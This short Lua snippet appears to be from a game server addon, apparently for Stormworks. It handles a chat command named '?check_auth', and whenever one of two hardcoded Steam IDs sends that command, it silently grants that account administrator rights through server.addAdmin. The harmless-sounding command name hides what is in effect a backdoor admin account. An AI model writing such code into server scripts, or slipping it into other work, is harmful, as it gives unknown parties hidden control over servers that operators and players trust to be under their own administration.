if command=="?check_auth" then

    if steam_id=="76561199002463913" then
        if not admin then
            server.addAdmin(user_id)
        end
    end
    if steam_id=="76561198927555089" then
        if not admin then
            server.addAdmin(user_id)
        end
    end
end